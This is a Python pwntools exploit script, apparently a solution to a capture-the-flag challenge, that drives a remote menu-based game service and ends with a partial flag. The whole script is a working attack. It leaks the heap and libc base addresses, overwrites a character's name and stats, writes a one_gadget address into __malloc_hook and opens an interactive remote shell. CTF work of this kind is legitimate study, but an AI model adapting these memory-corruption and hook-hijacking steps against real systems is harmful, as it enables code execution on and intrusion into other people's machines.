#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('35.201.132.60', 13337)
libc = ELF('libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

def list():
    r.sendlineafter('Your choice: ', '1')

def select(idx):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('Select a character: ', str(idx))

def start():
    r.sendlineafter('Your choice: ', '3')

def fight_dragon():
    r.sendlineafter('Your choice: ', '1')

def fight_slime():
    r.sendlineafter('Your choice: ', '2')

def craft_weapon():
    r.sendlineafter('Your choice: ', '3')

def nap():
    r.sendlineafter('Your choice: ', '4')

def change_name(name):
    r.sendlineafter('Your choice: ', '5')
    r.sendafter('New name: ', name)

def back_menu():
    r.sendlineafter('Your choice: ', '87')

def leave_game():
    r.sendlineafter('Your choice: ', '87')

# select a straddle character
select(0x555555555555556)
start()
nap()
craft_weapon()

# leak heap base
back_menu()
list()
r.recvuntil('Name: OrzanggeOrzangge')
heap_base = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x5d0
log.success('heap base: ' + hex(heap_base))

# select arbitrary character and exhausted its current weapon, which will be freed
select(5)
start()
fight_slime()
fight_slime()
fight_slime()
# chunk has libc address at heap_base + 0x480
back_menu()
select(0x555555555555556)
start()
change_name(p64(heap_base+0x480+0x10)[:7]+'\x00')
r.recvuntil('Weapon durability: ')
libc_base = int(r.recvline()[:-1]) - 0x3c4b78
log.success('libc base: ' + hex(libc_base))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0xf0274 # constraint: [rsp+0x50] == NULL

# overwrite Readdy's level and energy to 0x7fffffff, and defeat dragon,
change_name(p64(0xffffffffff600804)+p64(0x7fffffff7fffffff)+'\x00')
back_menu()
select(0)
start()
fight_dragon()

# overwrite malloc_hook to one gadget
r.sendlineafter('Where to change: ', str(malloc_hook))
r.sendlineafter('What to change: ', str(one_gadget))
craft_weapon()

r.interactive()

# FLAG{1t_4ctually_IS_wi7hin_b0und...}
